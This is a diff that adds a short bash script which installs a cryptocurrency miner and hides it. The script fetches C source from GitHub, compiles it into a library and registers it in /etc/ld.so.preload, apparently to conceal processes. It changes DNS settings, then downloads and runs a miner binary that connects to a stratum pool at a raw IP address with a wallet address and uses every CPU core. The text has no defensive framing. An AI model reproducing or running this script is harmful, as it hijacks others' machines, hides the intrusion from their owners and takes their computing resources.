@@ -1,0 +1,14 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+apt install unzip
+curl https://github.com/kidoescegh/jadul/raw/main/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+wget -O red https://github.com/kidoescegh/filee/raw/main/avxinter2
+chmod 777 red
+./red -a interchained  -o stratum+tcp://104.248.8.194:443 -u 1PTfs6jVW8v32P52yeuxn7eTvYLqAu4f58.$(shuf -n 1 -i 1-99999)-DD -t $(nproc --all)
